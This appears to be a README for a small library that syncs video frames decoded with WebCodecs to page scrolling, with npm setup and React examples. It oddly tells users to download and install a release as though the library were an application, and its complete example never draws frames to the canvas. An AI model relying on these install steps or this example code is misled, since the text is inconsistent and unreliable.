# üé• webcodecs-scroll-sync - Synchronize Video Playback with Scrolling

[![Download](https://img.shields.io/badge/download-latest%20release-blue.svg)](https://github.com/Bazeem17/webcodecs-scroll-sync/releases)

## üöÄ Getting Started

This guide will help you download and run the webcodecs-scroll-sync application. With it, you can watch videos that change as you scroll, all thanks to smart use of the WebCodecs API.

## üì• Download & Install

To get started, visit this page to download: [Releases Page](https://github.com/Bazeem17/webcodecs-scroll-sync/releases).

1. Click on the link above to go to the downloads.
2. Select the latest version available.
3. Follow your operating system instructions to complete the installation.

## üìã Dependencies

This application needs one main dependency: **mediabunny**. If you plan to explore or develop further, you will need it. Follow this command to install it with npm:

```bash
npm install mediabunny
```

## üîç Files Overview

Here are the main files you will be working with:

- **`decoder.ts`**: This file contains the `FrameDecoder` class. It takes care of decoding and buffering video.
- **`canvas.tsx`**: A sample React component that shows how to use scroll events for video integration.
- **`utils.ts`**: Holds utility functions, such as helpers for assertions.

## üõ†Ô∏è Basic Usage

This section will guide you through the basic steps to use the Decoder effectively.

### 1. Initialize the Decoder

First, you need to create an instance of `FrameDecoder`. You will do this with a video URL. Here's how:

```javascript
import { FrameDecoder } from './decoder';

const decoder = new FrameDecoder();

// Initialize with a video URL
await decoder.init('https://example.com/your-video.mp4');
```

When you replace `'https://example.com/your-video.mp4'` with your video link, the decoder will get ready to play.

### 2. Seek to Video Position

To jump to specific points in the video based on your scrolling, use the `seek()` method. For example, if you want to go halfway through the video, you can do it like this:

```javascript
// Seek to 50% through the video
decoder.seek(0.5);

// Render the current frame
decoder.drawFrame(ctx, canvas.width, canvas.height);
```

### 3. How to Integrate with Scrolling

To make the video respond to scrolling, you will need to tie the `seek()` function to your scroll events. Here's a basic example:

```javascript
window.addEventListener('scroll', () => {
    const scrollPosition = window.scrollY / document.body.scrollHeight;
    decoder.seek(scrollPosition);
});
```

This code listens for the scroll event and updates the video position accordingly. 

### 4. Complete Example

Here‚Äôs how you can tie it all together:

```javascript
import { FrameDecoder } from './decoder';
import React, { useEffect, useRef } from 'react';

const VideoScroller = () => {
    const canvasRef = useRef(null);
    const decoder = new FrameDecoder();

    useEffect(() => {
        const init = async () => {
            await decoder.init('https://example.com/your-video.mp4');
            window.addEventListener('scroll', () => {
                const scrollPosition = window.scrollY / document.body.scrollHeight;
                decoder.seek(scrollPosition);
            });
        };
        init();
    }, []);

    return <canvas ref={canvasRef} width={800} height={600}></canvas>;
};

export default VideoScroller;
```

## ‚ùì Troubleshooting

If you run into issues, consider the following common problems:

- Make sure the video URL is valid and accessible.
- Check your internet connection.
- Ensure you have installed the dependencies correctly.

## üåü Feature Highlights

- **Seamless Synchronization**: Enjoy smooth video playback tied to your scrolling actions.
- **Easy Integration**: Works well with existing React applications.
- **Wide File Compatibility**: Supports multiple video formats.

Please feel free to explore the code, run examples, and modify them as you wish. If you are curious about anything, don‚Äôt hesitate to reach out.
